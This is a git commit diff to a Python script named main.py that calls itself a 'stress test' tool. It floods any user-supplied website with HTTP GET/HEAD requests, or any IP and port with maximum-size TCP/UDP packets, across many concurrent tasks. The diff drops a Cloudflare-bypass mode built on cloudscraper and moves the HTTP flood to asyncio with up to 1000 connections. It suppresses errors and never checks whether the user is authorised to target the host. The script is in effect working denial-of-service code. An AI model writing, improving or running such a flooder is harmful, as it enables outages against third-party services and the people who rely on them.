fe67456c4a460814e4641c9d58ce200b1355016f
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-22 14:47:55 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-import cloudscraper
+import asyncio
 import httpx
 import socket
 import threading
@@ -7,16 +7,16 @@ from colorama import Fore, Style, init
 
 init()
 
-print("Layer 7: get, head, cfb")
+print("Layer 7: get, head")
 print("Layer 4: tcp, udp")
-protocol = input("Enter the method to use:")
+protocol = input("Enter the method to use: ")
 
-if protocol in ["get", "head", "cfb"]:
+if protocol in ["get", "head"]:
     url = input("Enter the website URL (including http or https): ")
 elif protocol in ["tcp", "udp"]:
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
-    
+
 num_threads = int(input("Enter the number of threads to use: "))
 
 duration = int(input("Enter the duration of the stress test in seconds: "))
@@ -25,33 +25,23 @@ if protocol == "udp":
     packet_size = 65507 # Maximum size for a UDP packet
 elif protocol == "tcp":
     packet_size = 65535 # Maximum size for a TCP packet
- 
+
 packet_counter = 0
 packet_counter_lock = threading.Lock()
 
-def stress_test(thread_id):
+async def stress_test(thread_id, client):
     global packet_counter
-
-    if protocol == "cfb":
-        client = cloudscraper.create_scraper()
-    elif protocol in ["get", "head"]:
-        client = httpx.Client(pool_limits=httpx.PoolLimits(max_keepalive_connections=1000, max_connections=1000))
-    elif protocol in ["tcp", "udp"]:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    else:
-        print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
-        return
 
     start_time = time.time()
     last_print_time = start_time - 9
     if thread_id == 0:
-        if protocol in ["get", "head", "cfb"]:
+        if protocol in ["get", "head"]:
             print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
         elif protocol in ["tcp", "udp"]:
             print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
     while time.time() - start_time < duration:
-        if protocol in ["get", "head", "cfb"]:
-            send_request(client)
+        if protocol in ["get", "head"]:
+            await send_request(client)
             with packet_counter_lock:
                 packet_counter += 1
         elif protocol in ["tcp", "udp"]:
@@ -60,10 +50,10 @@ def stress_test(thread_id):
                 packet_counter += 1
         if thread_id == 0 and time.time() - last_print_time >= 10:
             with packet_counter_lock:
-                if protocol in ["get", "head", "cfb"]:
+                if protocol in ["get", "head"]:
                     try:
                         response_start_time = time.time()
-                        response = httpx.get(url)
+                        response = await client.get(url)
                         response_end_time = time.time()
                         response_time = round((response_end_time - response_start_time) * 1000, 2)
                         print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
@@ -73,12 +63,12 @@ def stress_test(thread_id):
                     print(f"Sent {packet_counter} packets to {ip}:{port}")
                 last_print_time = time.time()
 
-def send_request(client):
+async def send_request(client):
     try:
         if protocol == "get":
-            response = client.get(url)
+            response = await client.get(url)
         elif protocol == "head":
-            response = client.head(url)
+            response = await client.head(url)
     except Exception as e:
         pass # Suppress error messages
 
@@ -93,13 +83,15 @@ def send_packet(sock):
     except Exception as e:
         pass 
 
-threads = []
-for i in range(num_threads):
-    thread = threading.Thread(target=stress_test, args=(i,))
-    thread.start()
-    threads.append(thread)
+async def main():
+    async with httpx.AsyncClient(limits=httpx.Limits(max_connections=1000)) as client:
+        tasks = []
+        for i in range(num_threads):
+            task = asyncio.create_task(stress_test(i, client))
+            tasks.append(task)
 
-for thread in threads:
-    thread.join()
+        await asyncio.gather(*tasks)
+
+asyncio.run(main())
 
 print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
